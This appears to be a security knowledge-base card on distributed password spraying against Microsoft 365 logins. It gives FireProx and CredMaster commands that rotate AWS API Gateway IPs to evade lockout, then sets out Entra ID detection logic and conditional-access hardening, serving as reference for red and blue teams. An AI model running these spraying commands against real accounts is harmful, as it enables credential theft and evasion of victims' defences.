# [CA-BRUTE-002]: Distributed Password Spraying

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-BRUTE-002 |
| **MITRE ATT&CK v18.1** | [Password Spraying (T1110.003)](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Multi-Env (AWS/Azure) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** To bypass IP-based blocking and "Smart Lockout" algorithms, attackers distribute their password spray across thousands of unique IP addresses. This is typically achieved using ephemeral cloud resources like **AWS API Gateway** (FireProx) or Lambda functions, which rotate IPs with every request.
- **Attack Surface:** Any public authentication endpoint.
- **Business Impact:** **Evasion of Defense**. Bypassing standard WAF/IP reputation lists.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** AWS Account (for infrastructure).
- **Tools:**
    - [FireProx](https://github.com/ustayready/fireprox)
    - [CredMaster](https://github.com/knavesec/CredMaster)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Deploy API Gateway**
Use FireProx to create a pass-through proxy to `login.microsoftonline.com`.
```bash
python fireprox.py --command create --url https://login.microsoftonline.com
```

**Step 2: Spray via Proxy**
Point your spraying tool (CredMaster) at the generated FireProx URL.
```bash
python3 credmaster.py --plugin o365 --access_key ... --url https://<api-id>.execute-api.us-east-1.amazonaws.com/fireprox/
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `Sign-in error` | A sudden spike in failed logins from **AWS IP ranges** (Amazon Data Services). Defenders should correlate `50126` errors with Cloud Provider ASNs. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Geofencing:** Block logins from countries where no employees operate.
*   **Conditional Access:** Block authentication from "Anonymizer Services" or known Cloud Provider IP ranges (unless specific business justification exists).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-004]
> **Next Logical Step:** [CA-BRUTE-003]
